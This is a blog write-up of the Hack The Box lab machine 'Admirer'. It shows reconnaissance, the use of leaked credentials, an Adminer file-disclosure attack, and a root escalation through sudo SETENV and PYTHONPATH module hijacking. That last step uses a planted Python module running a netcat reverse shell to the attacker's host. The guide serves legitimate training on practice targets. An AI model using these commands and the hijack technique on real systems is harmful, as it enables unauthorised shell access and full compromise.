---
layout: post
title:  "Hack The Box - Admirer"
date:   2020-09-27 02:56:00 +0800
categories: hackthebox linux adminer sudo
---

![](/assets/images/admirer.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.187 admirer.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC admirer.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 07:58 EDT
Nmap scan report for admirer.htb (10.10.10.187)
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds

{% endhighlight %}

# Enumeration (1)

There was no anonymous access for the `ftp` service on port `21` and we didn't have any credentials for the `ssh` service on port `22` so lets move straight to the `http` service on port `80`.

![](/assets/images/admirer1.png)

Very nice home page but its not linked to any useful pages. Hmm... Lets check out `robots.txt`.

![](/assets/images/admirer2.png)

Unfortunately, accessing `http://admirer.htb/admin-dir/` led to a `403`, so I think its time to bust out the directory brute-forcer.

{% highlight bash %}
$ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 12 -k -x .php,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admirer.htb/admin-dir
[+] Threads:        12
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/05/28 08:31:50 Starting gobuster
===============================================================
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
{% endhighlight %}

Lets visit them.

`http://admirer.htb/admin-dir/contacts.txt`:

{% highlight raw %}
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
{% endhighlight %}

`http://admirer.htb/admin-dir/credentials.txt`:

{% highlight raw %}
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
{% endhighlight %}

Using the `ftp` credentials we found, we can go back to the `ftp` service.

{% highlight bash %}
$ ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:root): ftpuser
331 Please specify the password.
Password: %n?4Wz}R$tTF7
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
{% endhighlight %}

We see 2 files so lets download them and analyse them. The `dump.sql` contained nothing useful so lets see what's inside of `html.tar.gz`

{% highlight bash %}
$ tar -xvf html.tar.gz
$ ls -al
total 5188
drwxr-xr-x  6 root root        4096 May 28 08:43 .
drwxr-xr-x 27 root root        4096 Aug 22 05:34 ..
drwxr-x---  6 root www-data    4096 Jun  6  2019 assets
-rw-r--r--  1 root root     5270987 May 28 08:42 html.tar.gz
drwxr-x---  4 root www-data    4096 Dec  2  2019 images
-rw-r-----  1 root www-data    4613 Dec  3  2019 index.php
-rw-r-----  1 root www-data     134 Dec  1  2019 robots.txt
drwxr-x---  2 root www-data    4096 May 28 09:38 utility-scripts
drwxr-x---  2 root www-data    4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
{% endhighlight %}

In this folder were 3 interesting files. 

{% highlight bash %}
$ index.php
...
                                         <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";
...
{% endhighlight %}

Alright, we got one set of credentials. In `utility-scripts`, there was a `admin_tasks.php`.

{% highlight bash %}
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>
{% endhighlight %}

If we visit it, this is how it looks:

![](/assets/images/admirer3.png)

We can't inject any arbitrary commands into the `shell_exec` since the `if` check is pretty tight. Moving on, there was another file called `db_admin.php`.

{% highlight bash %}
$ cat utility-scripts/db_admin.php
...
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);
...
// TODO: Finish implementing this or find a better open source alternative
{% endhighlight %}

Cool we found some database credentials but we can't use them yet. However this page doesn't exist anymore. Could it have to do with the comment in `db_admin.php`?

I consulted the forums and people were saying that the name of this box was a hint. I went to google "`open source admirer`" and I found what they were talking about.

![](/assets/images/admirer4.png)

{% highlight raw %}
Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.
...
Usage: Just put the file adminer.css alongside adminer.php.
{% endhighlight %}

The usage tells us that there is a `adminer.php`, so lets see if it's there.

`http://admirer.htb/utility-scripts/adminer.php`:

![](/assets/images/admirer5.png)

# Exploitation (1)

We found our next lead! I tested out the credentials we found but they were incorrect :( Maybe the files we found were outdated? Searching online, this version of `Adminer` (`4.6.2`) has a [vulnerability](https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/) which allows us to read files on the web server. I followed this [guide](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) which allowed to me read `index.php` on the web server.

First, we will need a `SQL` server. Fortunately, Kali Linux already comes with `MariaDB` installed so all we have to do is start it.

{% highlight bash %}
$ systemctl start mysql
{% endhighlight %}

Next, we will need to create a new account and assign privileges to it.
{% highlight bash %}
$ mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.3.20-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [(none)]> CREATE USER 'root'@'admirer.htb' IDENTIFIED BY 'toor';
Query OK, 0 rows affected (0.000 sec)
MariaDB [(none)]> GRANT ALL PRIVILEGES ON * . * TO 'root'@'admirer.htb';
Query OK, 0 rows affected (0.000 sec)
{% endhighlight %}

Now we can use `adminer.php` to access our `MariaDB` server by entering our attacker's machine IP Address as the Server, `root` as the username and `toor` as the password. The database field can be left blank.

![](/assets/images/admirer7.png)

We then need to create a new database and new table inside it.

![](/assets/images/admirer8.png)

![](/assets/images/admirer9.png)

Now, we can proceed to load the contents of `index.php` into the table we made.

![](/assets/images/admirer10.png)

And finally, we can view the contents of `index.php`.

![](/assets/images/admirer11.png)

We can use these new credentials to login to the database on the box but there was only one table which contained nothing useful.

![](/assets/images/admirer12.png)

# user.txt

Thinking back, there was a `ssh` service running port `22`. Perhaps we can `ssh` with the credentials?

{% highlight bash %}
$ ssh waldo@admirer.htb
waldo@admirer.htb's password: &<h5b~yK3F#{PaPB&dA}{H>
waldo@admirer:~$ cat user.txt
a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

As `waldo`, we got `sudo` rights to run `/opt/scripts/admin_tasks.sh`.

{% highlight bash %}
waldo@admirer:~$ sudo -l 
[sudo] password for waldo: &<h5b~yK3F#{PaPB&dA}{H>
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
{% endhighlight %}

Lets see what's inside.

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
{% endhighlight %}

It's quite long but if we zoom in to the `backup_web` function, we see that it is running a `python` script `/opt/scripts/backup.py`.

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
{% endhighlight %}

This script simply creates a `.tar.gz` file from the contents of `/var/backups/html`. 

# Exploitation (2)

Hmm... How does the `SETENV` in the `sudo` rights come into place? With `SETENV`, we are able to set/modify environment variables when running the script with `sudo`. For example, I can do this: `sudo x=something /opt/scripts/admin_tasks.sh` and the script will run with the environment variable `x` set to `something`. 

Since we know that the script executes `make_archive` from the `shutil` module, what we can do is create a fake `shutil` module with a fake `make_archive` function and modify the `$PYTHONPATH` variable to point to the location of our fake module and run the script! The `$PYTHONPATH` contains a list of additional directories where `Python` looks for modules for importing. 

{% highlight bash %}
waldo@admirer:~$ cat shutil.py
import os

def make_archive(a,b,c):
    os.system("nc 10.10.XX.XX 1337 -e /bin/bash")

{% endhighlight %}

Now, all we have to do is run `admin_task.sh`.

{% highlight bash %}
waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
{% endhighlight %}

# root.txt

And on our listener we prepared beforehand,

{% highlight bash %}
$ nv -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.187] 56858
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

Rooted ! Thank you for reading and look forward for more writeups and articles !